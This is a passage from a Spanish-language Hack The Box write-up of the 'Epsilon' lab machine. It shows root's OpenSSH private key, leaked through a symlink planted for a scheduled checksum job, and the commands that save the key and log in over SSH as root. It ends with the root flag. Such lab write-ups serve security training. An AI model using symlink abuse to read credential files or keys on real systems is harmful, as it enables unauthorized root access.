cAF3ZlLawiGbgTY15kQTM6enrkI1Dwf+ucivcPKYnl3sG1mepV9ZesBzcoK0BWnCTruI7v
r1yPwVQeN5r6l134FEKppGOtoJiJn+MYT+EVsBwjklPJwyb9rNvorDHmCFxEgfJdcFj/RI
j6NDVpSfFj3tp84kgevL2Y0EucsS0bUL5Er6RwalvdH6x1paRtXl1SvEvQdNT7hKMUI0tH
zQEmds4RvEydVwGpsU92LjoV9iurLB9+llWEizhf9ig5WbGycscBtFfEJIBbtAz2dFfHJL
odKPi5uuDxV5UsjhXG/9UlP8MIneIvWmM4TTkDsQ0j4dr5l8Tw5AdP3SwDusAZTmpGLM67
lSzJJ4D/PUDiiyBmrJsyFPNeiirn1HS0hXM4oPemlUcXhXFQB4Ita8tTu066AiCXsIb7If
CP5HpgITR48Ld4phrpVJpSMP7NXKXQAAAAMBAAEAAAGBAMULlg7cg8oaurKaL+6qoKD1nD
Jm9M2T9H6STENv5//CSvSHNzUgtVT0zE9hXXKDHc6qKX6HZNNIWedjEZ6UfYMDuD5/wUsR
EgeZAQO35XuniBPgsiQgp8HIxkaOTltuJ5fbyyT1qfeYPqwAZnz+PRGDdQmwieIYVCrNZ3
A1H4/kl6KmxNdVu3mfhRQ93gqQ5p0ytQhE13b8OWhdnepFriqGJHhUqRp1yNtWViqFDtM1
lzNACW5E1R2eC6V1DGyWzcKVvizzkXOBaD9LOAkd6m9llkrep4QJXDNtqUcDDJdYrgOiLd
/Ghihu64/9oj0qxyuzF/5B82Z3IcA5wvdeGEVhhOWtEHyCJijDLxKxROuBGl6rzjxsMxGa
gvpMXgUQPvupFyOapnSv6cfGfrUTKXSUwB2qXkpPxs5hUmNjixrDkIRZmcQriTcMmqGIz3
2uzGlUx4sSMmovkCIXMoMSHa7BhEH2WHHCQt6nvvM+m04vravD4GE5cRaBibwcc2XWHQAA
AMEAxHVbgkZfM4iVrNteV8+Eu6b1CDmiJ7ZRuNbewS17e6EY/j3htNcKsDbJmSl0Q0HqqP
mwGi6Kxa5xx6tKeA8zkYsS6bWyDmcpLXKC7+05ouhDFddEHwBjlCck/kPW1pCnWHuyjOm9
eXdBDDwA5PUF46vbkY1VMtsiqI2bkDr2r3PchrYQt/ZZq9bq6oXlUYc/BzltCtdJFAqLg5
8WBZSBDdIUoFba49ZnwxtzBClMVKTVoC9GaOBjLa3SUVDukw/GAAAAwQD0scMBrfeuo9CY
858FwSw19DwXDVzVSFpcYbV1CKzlmMHtrAQc+vPSjtUiD+NLOqljOv6EfTGoNemWnhYbtv
wHPJO6Sx4DL57RPiH7LOCeLX4d492hI0H6Z2VN6AA50BywjkrdlWm3sqJdt0BxFul6UIJM
04vqf3TGIQh50EALanN9wgLWPSvYtjZE8uyauSojTZ1Kc3Ww6qe21at8I4NhTmSq9HcK+T
KmGDLbEOX50oa2JFH2FCle7XYSTWbSQ9sAAADBAOD9YEjG9+6xw/6gdVr/hP/0S5vkvv3S
527afi2HYZYEw4i9UqRLBjGyku7fmrtwytJA5vqC5ZEcjK92zbyPhaa/oXfPSJsYk05Xjv
6wA2PLxVv9Xj5ysC+T5W7CBUvLHhhefuCMlqsJNLOJsAs9CSqwCIWiJlDi8zHkitf4s6Jp
Z8Y4xSvJMmb4XpkDMK464P+mve1yxQMyoBJ55BOm7oihut9st3Is4ckLkOdJxSYhIS46bX
BqhGglrHoh2JycJwAAAAxyb290QGVwc2lsb24BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
</code></pre></div></div>

<p>Observamos que al abrir el checksum, ya no es un sha1 del archivo tar original, sino la id_rsa de root debido al symlink. Con esto ahora solo falta copiarnosla y darle el privilegio 600 y entrar con ssh:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano id_rsa
chmod 600 id_rsa

ssh -i id_rsa root@10.10.11.134
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@epsilon:~# whoami
root
</code></pre></div></div>

<p>Hemos logrado entrar como el usuario root, vamos a buscarla la flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@epsilon:~# cat /root/root.txt
fadbe3960616546fc32f5a2
</code></pre></div></div>

<p>¡Listo!, hemos terminado la máquina.</p>

<p>Nos vemos, hasta la próxima.</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#aws" class="page__taxonomy-item" rel="tag">AWS</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#cloud" class="page__taxonomy-item" rel="tag">Cloud</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#enumeration" class="page__taxonomy-item" rel="tag">Enumeration</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#git" class="page__taxonomy-item" rel="tag">Git</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#scheduled-job-abuse" class="page__taxonomy-item" rel="tag">Scheduled Job Abuse</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#ssti" class="page__taxonomy-item" rel="tag">SSTI</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#symlink" class="page__taxonomy-item" rel="tag">Symlink</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hack-the-box" class="page__taxonomy-item" rel="tag">Hack The Box</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#write-up" class="page__taxonomy-item" rel="tag">Write up</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-03-04T00:00:00-05:00">March 04, 2023</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/DarkHole_2/" class="pagination--pager" title="Dark hole 2 VulnHub Write-up
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2023 grafis</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
